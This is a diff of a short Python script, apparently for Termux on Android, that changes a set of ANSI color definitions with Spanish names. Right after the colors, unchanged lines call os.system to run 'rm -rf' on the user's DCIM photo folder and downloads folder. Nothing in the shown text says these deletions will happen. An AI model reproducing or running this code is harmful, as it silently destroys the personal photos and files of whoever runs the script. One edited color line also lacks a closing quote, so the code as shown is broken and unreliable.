@@ -1,14 +1,14 @@
 import os, sys, time, io
 
-class color:
-    morado = '\033[95m'
-    blanco = '\033[97m'
-    cyan = '\033[96m'
-    azul  = '\033[94m'
-    verde = '\033[92m'
-    amarillo = '\033[93m'
-    rojo = '\033[91m'
-    fin = '\033[0m'
+negro = '\033[30m'
+rojo = '\033[31m'
+verde = '\033[32m'
+amarillo = '\033[33m'
+azul = '\033[34m'
+rosado = '\033[35m'
+calipso= '\033[36m'
+blanco = '\033[37m'
+cierre = '\033[39m
 
 os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
